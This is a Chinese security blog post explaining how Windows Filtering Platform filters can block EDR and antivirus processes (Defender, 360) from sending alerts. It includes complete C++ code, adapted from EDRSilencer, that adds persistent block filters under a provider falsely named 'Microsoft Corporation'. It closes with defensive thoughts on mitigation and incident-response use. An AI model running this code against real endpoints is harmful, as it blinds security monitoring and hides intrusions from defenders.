---
layout:       post
title:        "借助Windows_WFP静默端上edr等应用"
subtitle:     "学习windows底层的流量过滤平台在攻防场景中的使用及思考"
author:      "Ga0weI"
header-style: text
catalog:      true
tags:
    - WFP
    - windows
    - 免杀
    - 影藏
    - 应急
---

# 0x01 背景



之前接触到了edr致盲的思路，于是学习了下windows下的WFP的使用；


作为windows上底层的网络过滤平台，防火墙、一些防病毒软件、vpn等相关产品都是基于WFP来实现的；

最常见的edr致盲手段就是通过防火墙禁止IP、应用来实现，而防火墙其实就就是一个封装好带ui的简易版WFP；所以这里准备直接学习下WFP的原理、开发即使用；

# 0x02 WFP使用

## WFP基本信息

全称（Windows Filter Platfrom）Windows 筛选平台 ,其是一个网络流量处理平台；



windows官方展示其主要的功能包括如下：

```txt
提供数据包筛选基础结构， (ISV) 的独立软件供应商可以插入专用筛选模块。
适用于 IPv4 和 IPv6。
允许数据筛选、修改和重新注入。
执行数据包和流处理。
除了每个网络接口或每个端口之外，还允许按应用程序、每个用户和每个连接启用数据包筛选。
提供启动时安全性，直到基本筛选引擎 (BFE) 可以启动。
启用有状态连接筛选。
处理 IPsec 加密前数据和后加密数据。
允许集成 IPsec 和防火墙筛选策略。
提供策略管理基础结构，以确定何时应激活特定筛选器。 这包括调解不同供应商提供的多个筛选器的冲突要求。
处理大多数数据包重组和状态跟踪。
包括一个通用用户通知系统，用于通知订阅者筛选系统的更改。
实现报告系统状态的枚举函数。
使用网络事件来记录 IPsec 错误和数据包丢弃。
支持网络诊断框架 (NDF) 帮助程序类。
支持 Winsock API 的安全套接字扩展 ，允许网络应用程序通过配置 WFP 来保护其流量。
在应用程序层强制 (ALE) 层中，仅处理连接中的第一个数据包，对网络性能的影响最小。
集成硬件卸载，其中内核模式标注模块可以使用硬件执行特定数据包检查。
```



这里我们主要主要围绕使用其对数据包的筛选处理的功能开展使用学习；

WFP主要的组件如下：

```
Filter Engine:内核模式和用户模式下托管的核心多层筛选基础结构
Base Filtering Engine (BFE):控制 Windows 筛选平台操作的服务
Shims:驻留在网络堆栈和筛选器引擎之间的内核模式组件
Callouts:由驱动程序公开并用于专用筛选的函数集。 除了“允许”和“阻止”的基本操作外，标注还可以修改和保护入站和出站网络流量
Application Programming Interface：供开发人员使用的相关接口
```

用户层我们只用关注FilterEngine、Callouts和ApplicationProgrammingInterface这个三个即可；

简单理解就是过滤器+过滤处理函数+wfp windows开发接口；



如下通过WFPExplore我们可以看到本地所有的过滤器，一般来说EDR都会做Filter的，用来分析过滤网络流量；比如识别到恶意流量入栈流量，直接block丢弃相关流量；

![image-20241016182942317](/img/借助Windows_WFP静默端上edr等应用/image-20241016182942317.png)



比如下面这个filter，我们可以看到其Action 和Callout，就是当匹配到相关条件的时候要执行的动作以及其调用的函数

![image-20241016183526291](/img/借助Windows_WFP静默端上edr等应用/image-20241016183526291.png)

同样我们也可以看到的其过滤条件，如下，我们可以看到匹配appid和IP_protocol字段，appid的值其实就是应用程序的windows nt路径，下图中对应的是chrom的NT全路径地址；

![image-20241016183729513](/img/借助Windows_WFP静默端上edr等应用/image-20241016183729513.png)



## 静默EDR实现

那么我们如何使用WFP来静默EDR呢，其实也非常简单，和上面一样，我们创建的一个Filter，过滤条件中appid设置为对应edr外联传输告警的进程即可，action我们配置为block即可；

如下是直接通过EDRSilencer这个工具来创建filter,过滤ipv4和ipv6的出去的流量：

![image-20241016191918256](/img/借助Windows_WFP静默端上edr等应用/image-20241016191918256.png)

查看，过滤到符合特征的流量，处理动作设置为Block，丢弃

![image-20241016192008399](/img/借助Windows_WFP静默端上edr等应用/image-20241016192008399.png)



如下图，过滤条件就是把appid设置为windowsdefender的msmpeng.exe对应的nt路径。

![image-20241016192044159](/img/借助Windows_WFP静默端上edr等应用/image-20241016192044159.png)







# 0x03 代码实现

通过查看EDRSilencer的源码，我们学习下用户层的WFP，开发Filter。



这里我们实现一个禁止指定应用程序出网的WFP程序即可：

核心步骤：

- 1、通过FwpmEngineOpen0函数获取筛选引擎句柄：engineHandle

- 2、通过FwpmProviderAdd0函数创建一个provider；
- 3、通过FwpmFilterAdd0函数，借助provider创建一个Filter，匹配之后的action直接置为block

代码实现如下

```c++
#include <windows.h>
#include <initguid.h>
#include <fwpmu.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "fwpuclnt.lib")


typedef enum ErrorCode {
    CUSTOM_SUCCESS = 0,
    CUSTOM_FILE_NOT_FOUND = 0x1,
    CUSTOM_MEMORY_ALLOCATION_ERROR = 0x2,
    CUSTOM_NULL_INPUT = 0x3,
    CUSTOM_DRIVE_NAME_NOT_FOUND = 0x4,
    CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME = 0x5,
} ErrorCode;

void CharArrayToWCharArray(const char charArray[], WCHAR wCharArray[], size_t wCharArraySize) {
    int result = MultiByteToWideChar(CP_UTF8, 0, charArray, -1, wCharArray, wCharArraySize);

    if (result == 0) {
        printf("[-] MultiByteToWideChar failed with error code: 0x%x.\n", GetLastError());
        wCharArray[0] = L'\0';
    }
}

BOOL FileExists(PCWSTR filePath) {
    if (!filePath) {
        return FALSE;
    }

    DWORD fileAttrib = GetFileAttributesW(filePath);
    if (fileAttrib == INVALID_FILE_ATTRIBUTES) {
        return FALSE;
    }

    return TRUE;
}

BOOL GetDriveName(PCWSTR filePath, wchar_t* driveName, size_t driveNameSize) {
    if (!filePath) {
        return FALSE;
    }
    const wchar_t* colon = wcschr(filePath, L':');
    if (colon && (colon - filePath + 1) < driveNameSize) {
        wcsncpy(driveName, filePath, colon - filePath + 1);
        driveName[colon - filePath + 1] = L'\0';
        return TRUE;
    }
    else {
        return FALSE;
    }
}


ErrorCode ConvertToNtPath(PCWSTR filePath, wchar_t* ntPathBuffer, size_t bufferSize) {
    WCHAR driveName[10];
    WCHAR ntDrivePath[MAX_PATH];
    if (!filePath || !ntPathBuffer) {
        return CUSTOM_NULL_INPUT;
    }

    if (!GetDriveName(filePath, driveName, sizeof(driveName) / sizeof(WCHAR))) {
        return CUSTOM_DRIVE_NAME_NOT_FOUND;
    }

    if (QueryDosDeviceW(driveName, ntDrivePath, sizeof(ntDrivePath) / sizeof(WCHAR)) == 0) {
        return CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME;
    }

    swprintf(ntPathBuffer, bufferSize, L"%ls%ls", ntDrivePath, filePath + wcslen(driveName));

    for (size_t i = 0; ntPathBuffer[i] != L'\0'; ++i) {
        ntPathBuffer[i] = towlower(ntPathBuffer[i]);
    }
    return CUSTOM_SUCCESS;
}

ErrorCode CustomFwpmGetAppIdFromFileName0(PCWSTR filePath, FWP_BYTE_BLOB** appId) {
    if (!FileExists(filePath)) {
        return CUSTOM_FILE_NOT_FOUND;
    }

    WCHAR ntPath[MAX_PATH];
    printf("filepath:%ls\n", filePath);
    ErrorCode errorCode = ConvertToNtPath(filePath, ntPath, sizeof(ntPath));
    printf("ntpath:%ls\n", ntPath);
    if (errorCode != CUSTOM_SUCCESS) {
        return errorCode;
    }
    *appId = (FWP_BYTE_BLOB*)malloc(sizeof(FWP_BYTE_BLOB));
    if (!*appId) {
        return CUSTOM_MEMORY_ALLOCATION_ERROR;
    }

    (*appId)->size = wcslen(ntPath) * sizeof(WCHAR) + sizeof(WCHAR);

    (*appId)->data = (UINT8*)malloc((*appId)->size);
    if (!(*appId)->data) {
        free(*appId);
        return CUSTOM_MEMORY_ALLOCATION_ERROR;
    }
    memcpy((*appId)->data, ntPath, (*appId)->size);
    return CUSTOM_SUCCESS;
}

// Get provider GUID by description
BOOL GetProviderGUIDByDescription(PCWSTR providerDescription, GUID* outProviderGUID) {
    DWORD result = 0;
    HANDLE hEngine = NULL;
    HANDLE enumHandle = NULL;
    FWPM_PROVIDER0** providers = NULL;
    UINT32 numProviders = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return FALSE;
    }

    result = FwpmProviderCreateEnumHandle0(hEngine, NULL, &enumHandle);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmProviderCreateEnumHandle0 failed with error code: 0x%x.\n", result);
        FwpmEngineClose0(hEngine);
        return FALSE;
    }

    result = FwpmProviderEnum0(hEngine, enumHandle, 100, &providers, &numProviders);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmProviderEnum0 failed with error code: 0x%x.\n", result);
        FwpmEngineClose0(hEngine);
        return FALSE;
    }

    for (UINT32 i = 0; i < numProviders; i++) {
        if (providers[i]->displayData.description != NULL) {
            if (wcscmp(providers[i]->displayData.description, providerDescription) == 0) {
                *outProviderGUID = providers[i]->providerKey;
                return TRUE;
            }
        }
    }

    if (providers) {
        FwpmFreeMemory0((void**)&providers);
    }

    FwpmProviderDestroyEnumHandle0(hEngine, enumHandle);
    FwpmEngineClose0(hEngine);
    return FALSE;
}


void FreeAppId(FWP_BYTE_BLOB* appId) {
    if (appId) {
        if (appId->data) {
            free(appId->data);
        }
        free(appId);
    }
}

int main(int argc, char* argv[]) {

    char* fullPath = argv[1];
    ErrorCode errorCode = CUSTOM_SUCCESS;
    DWORD result = 0;
    HANDLE hEngine = NULL;
    FWP_BYTE_BLOB* appId = NULL;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return 0 ;
    }
    WCHAR wFullPath[MAX_PATH] = { 0 };
    CharArrayToWCharArray(fullPath, wFullPath, sizeof(wFullPath) / sizeof(wFullPath[0]));
    errorCode = CustomFwpmGetAppIdFromFileName0(wFullPath, &appId);
    printf("appid_data:%ls\n",appId->data);
    if (errorCode != CUSTOM_SUCCESS) {
        switch (errorCode) {
        case CUSTOM_FILE_NOT_FOUND:
            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", wFullPath);
            break;
        case CUSTOM_MEMORY_ALLOCATION_ERROR:
            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", wFullPath);
            break;
        case CUSTOM_NULL_INPUT:
            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", wFullPath);
            break;
        case CUSTOM_DRIVE_NAME_NOT_FOUND:
            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", wFullPath);
            break;
        case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", wFullPath);
            break;
        default:
            break;
        }
        return 0;
    }
    WCHAR* providerDescription = L"Microsoft Windows WFP Built-in custom provider.";
    WCHAR* providerName = L"Microsoft Corporation";
    WCHAR* filterName = L"Custom Outbound Filter";

    FWPM_FILTER0 filter = { 0 };
    FWPM_PROVIDER provider = {0};
    GUID providerGuid = {0};


    filter.displayData.name = filterName;
    filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
    filter.action.type = FWP_ACTION_BLOCK;

    FWPM_FILTER_CONDITION0 cond = {0};
    cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    cond.matchType = FWP_MATCH_EQUAL;
    cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    cond.conditionValue.byteBlob = appId;


    filter.numFilterConditions = 1;
    filter.filterCondition = &cond;

    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) { //遍历是否存在对于名称的Provider
        filter.providerKey = &providerGuid;
    }
    else {
        provider.displayData.name = providerName;
        provider.displayData.description = providerDescription;
        provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
        result = FwpmProviderAdd0(hEngine, &provider, NULL);
        if (result != ERROR_SUCCESS) {
            printf("[-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
        }
        else {
            if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
                filter.providerKey = &providerGuid;
            }
        }
    }

    UINT64 filterId =  0 ;
    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;

    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        printf("Added WFP filter for \"%s\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
    }
    else {
        printf("[-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
    }

    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        printf("Added WFP filter for \"%s\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
    }
    else {
        printf("[-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
    }
    FreeAppId(appId);
    FwpmEngineClose0(hEngine);
    return 1;

}
```

## 效果

运行效果，如下图，创建了两个Filter来过滤chrom的ipv4和v6的出站流量。

![image-20241017160417183](/img/借助Windows_WFP静默端上edr等应用/image-20241017160417183.png)



通过WFPExplore查看：

![image-20241017160726894](/img/借助Windows_WFP静默端上edr等应用/image-20241017160726894.png)

详情：

![image-20241017160920321](/img/借助Windows_WFP静默端上edr等应用/image-20241017160920321.png)



条件即appid = 对于的app dos路径

![image-20241017160941751](/img/借助Windows_WFP静默端上edr等应用/image-20241017160941751.png)

此时使用chrom，无法联网。

![image-20241017160601691](/img/借助Windows_WFP静默端上edr等应用/image-20241017160601691.png)



# 0x04 思考

这里我们思考两个问题：

## 问题1

**之所以攻击者可以通过WFP来致盲EDR，主要原因是只要有system权限，可以操作WFP，创建以及修改等；那么防守方（被静默的EDR）该如何破局呢？**

这里我们来看下360，因为上面我们查看WFP的时候可以看到360是做了很多Filter的，如下图：



![image-20241018103847439](/img/借助Windows_WFP静默端上edr等应用/image-20241018103847439.png)



其中包括：

```
360netmon
360AntiHijack
LiveUpdate360
360安全卫士实时保护
360Safe.exe

所有的ALE v4/v6层，即ipv4、v6
```



通过资源监视器，我们可以看到的360的两个外联进程，360Safe.exe和360Tray.exe及其对应的pid

![image-20241018104418511](/img/借助Windows_WFP静默端上edr等应用/image-20241018104418511.png)

通过pid，我们拿到相关进程的网络情况

![image-20241018104652719](/img/借助Windows_WFP静默端上edr等应用/image-20241018104652719.png)



然后添加WFPFilter来静默360，如下图。

![image-20241018104829899](/img/借助Windows_WFP静默端上edr等应用/image-20241018104829899.png)





此时查看网络连接状态,如下图，此时未见网络连接。

![image-20241018104941103](/img/借助Windows_WFP静默端上edr等应用/image-20241018104941103.png)





那么也就是说，360的网络也会被静默，估计前面的那堆360的filter是用来对抗其他的流量劫持的，在此是不生效的；



这里的确不好做，因为system权限可以随意操作WFP 用户层的东西；

不过可以尝试利用Filter的优先级（权重、协议层级方面）做一些缓解，当然攻击者也一样可以绕过，只需要把他自己创建的Filter优先级置于你防守WFP之上即可；





## 问题2

**WFP被用在攻击者的手里是一个利器，那么反过来，我们不妨从防守方的角度思考，该项技术可以用于哪些点？**



应急响应的时候，当我们定位到某个机器上的某个进程有问题，其就是远控进程，不断的再发起回连；此时我们可以通过WFP来block对于进程文件产生的外联流量；有人可能会觉得这不是多此一举，我都找到的样本进程了，找到文件直接干掉不就行了。其实不然，有时候当你还没找到其权限维持的方式的时候，其会不断的重新生成，所以删除并不能解决问题，而且我们要为受害机器争取时间，少被控1秒是1秒（很多场景下受害机器是不能断网的）；当然也有人会说，我直接从拓扑上的防火墙设备上ban掉对应IP或域名不行吗，当然可以，但是这是有缺陷的，如果客户那没有防火墙呢；又比如有些僵尸木马是通过dga算法生成c2，然后回连的，在没有掌握dga生成的全部域名集的情况下，你其实是ban不全的；从一个分析工程师的角度来看，笔者觉得这个WFP还是有用的；即保证了受害机器的安全又为分析人员拖延了时间，还能保留完整的分析环境的即被感染的环境中运行的进程；


这里测试了下，发现WFP添加Filter的过程sysmon日志中记录不到相关操作和日志；


# 参考：

https://github.com/netero1010/EDRSilencer

https://github.com/zodiacon/WFPExplorer

https://forum.butian.net/share/3706

https://learn.microsoft.com/zh-cn/windows/win32/fwp/about-windows-filtering-platform